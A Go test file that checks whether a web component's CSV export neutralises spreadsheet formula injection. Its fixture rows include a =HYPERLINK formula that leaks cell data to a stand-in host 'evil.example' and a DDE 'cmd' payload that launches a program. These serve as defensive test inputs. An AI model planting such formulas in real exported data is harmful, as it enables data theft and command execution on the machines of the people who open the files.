//go:build !cli

package main

import (
	"strings"
	"testing"

	esbuild "github.com/benmore-studio/benmore/third_party/esbuild/pkg/api"
	"github.com/dop251/goja"
)

// ExportButton writes rows other users typed into a CSV an admin opens in a
// spreadsheet. A cell starting with = + - @ (or tab/CR) ran as a formula
// (=HYPERLINK exfiltration, DDE); CR was not quoted either.
func TestSDUIExportButtonNeutralizesFormulas(t *testing.T) {
	compiled := esbuild.Build(esbuild.BuildOptions{
		Stdin:  &esbuild.StdinOptions{Contents: "export { ExportButton } from 'sdui';"},
		Bundle: true, Write: false, Format: esbuild.FormatIIFE, GlobalName: "sdui", Target: esbuild.ES2020,
		Plugins: []esbuild.Plugin{{Name: "fixture-modules", Setup: func(build esbuild.PluginBuild) {
			build.OnResolve(esbuild.OnResolveOptions{Filter: "^(sdui|bm)$"}, func(args esbuild.OnResolveArgs) (esbuild.OnResolveResult, error) {
				return esbuild.OnResolveResult{Path: args.Path, Namespace: "fixture"}, nil
			})
			build.OnLoad(esbuild.OnLoadOptions{Filter: ".*", Namespace: "fixture"}, func(args esbuild.OnLoadArgs) (esbuild.OnLoadResult, error) {
				source := "export default globalThis.fixtureBM;"
				if args.Path == "sdui" {
					source = string(sduiJS)
				}
				return esbuild.OnLoadResult{Contents: &source, Loader: esbuild.LoaderJS}, nil
			})
		}}},
	})
	if len(compiled.Errors) != 0 {
		t.Fatalf("compile shipped component: %v", compiled.Errors)
	}
	vm := goja.New()
	if _, err := vm.RunString(`
var handler, captured = '', failure = '';
var btn = {textContent: 'Export', disabled: false, addEventListener: (ev, fn) => { handler = fn; }};
var el = {innerHTML: '', querySelector: () => btn};
var document = {getElementById: () => ({}), createElement: () => ({click() {}})};
function Blob(parts) { this.parts = parts; }
var URL = {createObjectURL: b => { captured = b.parts.join(''); return 'blob:x'; }, revokeObjectURL() {}};
function URLSearchParams() { this.m = []; }
URLSearchParams.prototype.set = function (k, v) { this.m.push(k + '=' + v); };
URLSearchParams.prototype.toString = function () { return this.m.join('&'); };
var fixtureBM = {api: {get: () => Promise.resolve([{
  f: '=HYPERLINK("https://evil.example/?"&A1,"open")', dde: '-2+3+cmd|' + "' /C calc'!A0", at: '@SUM(1+1)',
  plus: '+1', tab: '\t=1', cr: 'a\rb', q: 'a,"b"', n: -5, plain: 'hello'
}])}};
`); err != nil {
		t.Fatal(err)
	}
	if _, err := vm.RunString(string(compiled.OutputFiles[0].Contents)); err != nil {
		t.Fatal(err)
	}
	if _, err := vm.RunString(`sdui.ExportButton(el, {table: 'contacts'}); handler();`); err != nil {
		t.Fatal(err)
	}
	csv := vm.Get("captured").String()
	lines := strings.SplitN(csv, "\n", 2)
	if len(lines) != 2 {
		t.Fatalf("export produced no data row: %q", csv)
	}
	want := `"'=HYPERLINK(""https://evil.example/?""&A1,""open"")",'-2+3+cmd|' /C calc'!A0,'@SUM(1+1),'+1,'` + "\t=1," + `"a` + "\r" + `b","a,""b""",-5,hello`
	if lines[1] != want {
		t.Fatalf("csv row:\n got %q\nwant %q", lines[1], want)
	}
	if lines[0] != "f,dde,at,plus,tab,cr,q,n,plain" {
		t.Fatalf("csv header: %q", lines[0])
	}
}
